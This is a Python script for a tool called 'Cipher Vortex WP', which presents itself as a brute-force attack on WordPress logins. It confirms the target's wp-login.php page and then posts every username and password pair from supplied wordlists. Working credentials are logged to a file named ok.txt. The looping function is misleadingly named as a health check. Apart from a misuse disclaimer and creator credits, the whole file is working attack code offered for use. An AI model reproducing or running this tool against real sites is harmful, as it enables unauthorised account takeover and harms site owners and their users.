import os
import requests
import logging
from datetime import datetime
from termcolor import colored
import time
from rich.console import Console

console = Console()

logging.basicConfig(filename='Cipher_Vortex_WP.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def read_file(filepath):
    if not os.path.exists(filepath):
        raise FileNotFoundError(f"File not found: {filepath}")
    with open(filepath, 'r', encoding='utf-8') as file:
        return file.read().splitlines()

def check_wordpress(url):
    try:
        response = requests.get(f"{url}/wp-login.php", timeout=5)
        return response.status_code == 200
    except requests.RequestException as e:
        logging.error(f"Failed to access WordPress login page {url}: {str(e)}")
        return False

def handle_response_error(response):
    if response.status_code == 500:
        print(colored("[!] Your IP has been blocked!", 'yellow'))
        logging.warning(f"Blocked IP: {response.url}")
        return True
    elif response.status_code == 403:
        print(colored("[!] Access Denied (403)!", 'yellow'))
        logging.warning(f"Access forbidden (403) on {response.url}")
        return True
    elif response.status_code == 404:
        print(colored("[!] Page not found (404)", 'yellow'))
        logging.warning(f"Page not found (404) on {response.url}")
        return True
    return False

def attempt_wp_login(url, username, password, output_file):
    try:
        response = requests.post(f"{url}/wp-login.php", data={'log': username, 'pwd': password}, timeout=5)
        
        if handle_response_error(response):
            return False, False  

        if "wp-admin" in response.url:
            logging.info(f"WordPress Success: {username}/{password} on {url}")
            print(colored(f"[+] WordPress Success: {username}/{password} [URL: {url}]", 'green'))

            with open(output_file, 'a') as f:
                f.write(f"[Cipher Vortex WP] - {datetime.now()} - Success: {username}/{password} [URL: {url}]\n")
            return True, True 
        else:
            logging.info(f"WordPress Failed: {username}/{password} on {url}")
            print(colored(f"[-] WordPress Failed: {username}/{password} [URL: {url}]", 'red'))
            return False, True  
    except requests.RequestException as e:
        logging.error(f"WordPress Login Error: {str(e)} on {url}")
    print(colored(f"WordPress Failed: {username}/{password} [URL: {url}]", 'red'))
    return False, False 

def health_check_wp(url, usernames, passwords, output_file, delay):
    success_count = 0
    failure_count = 0

    for username in usernames:
        for password in passwords:
            success, valid = attempt_wp_login(url, username, password, output_file)
            if valid:
                if success:
                    success_count += 1
                else:
                    failure_count += 1
            time.sleep(delay)  

    return success_count, failure_count

    
def main():
    Cipher_Vortex_WP = """
 ██████╗██╗██████╗ ██╗  ██╗███████╗██████╗     ██╗   ██╗ ██████╗ ██████╗ ████████╗███████╗██╗  ██╗    ██╗    ██╗██████╗ 
██╔════╝██║██╔══██╗██║  ██║██╔════╝██╔══██╗    ██║   ██║██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝╚██╗██╔╝    ██║    ██║██╔══██╗
██║     ██║██████╔╝███████║█████╗  ██████╔╝    ██║   ██║██║   ██║██████╔╝   ██║   █████╗   ╚███╔╝     ██║ █╗ ██║██████╔╝
██║     ██║██╔═══╝ ██╔══██║██╔══╝  ██╔══██╗    ╚██╗ ██╔╝██║   ██║██╔══██╗   ██║   ██╔══╝   ██╔██╗     ██║███╗██║██╔═══╝ 
╚██████╗██║██║     ██║  ██║███████╗██║  ██║     ╚████╔╝ ╚██████╔╝██║  ██║   ██║   ███████╗██╔╝ ██╗    ╚███╔███╔╝██║     
 ╚═════╝╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝      ╚═══╝   ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝     ╚══╝╚══╝ ╚═╝     
    """
    toolname = "Cipher Vortex WP - V1.0 [Cipher Vortex WP-brute force attack on wordpress]"
    creator = "Created by Cipher security"
    channel = "Telegram: @Cipher_security"
    github = "github: Cipher1security"
    disclaimer = "[!] We are not responsible for any misuse of this tool !"

    console.print(Cipher_Vortex_WP, style="bold blue")
    console.print(toolname, style="bold blue")
    console.print(creator, style="bold green")
    console.print(channel, style="bold green")
    console.print(github, style="bold green")
    console.print(disclaimer, style="bold red")

    url = input("Enter the URL of the WordPress site: ")
    if not url.startswith(('http://', 'https://')):
        print(colored("Invalid URL format. URL must start with http:// or https://", 'red'))
        return

    if not check_wordpress(url):
        print(colored("[!] The URL does not appear to be a WordPress site. Please check the URL and try again.", 'red'))
        return

    username_file = input("Enter the path to the usernames file: ")
    password_file = input("Enter the path to the passwords file: ")
    output_file = "ok.txt"

    try:
        usernames = read_file(username_file)
        passwords = read_file(password_file)
    except FileNotFoundError as e:
        print(colored(f"{e}", 'red'))
        return

    delay = input("Enter the delay (in seconds) between login attempts: ")
    if not delay.isdigit() or float(delay) < 0:
        print(colored("Invalid delay. Must be a non-negative number.", 'red'))
        return
    delay = float(delay)

    success_count, failure_count = health_check_wp(url, usernames, passwords, output_file, delay)
    print(colored(f"Number of successes: {success_count}", 'green'))
    print(colored(f"Number of failures: {failure_count}", 'red'))
    print(colored("[Cipher Vortex WP] - Brutus attack process finished!", 'blue'))

if __name__ == "__main__":
    main()
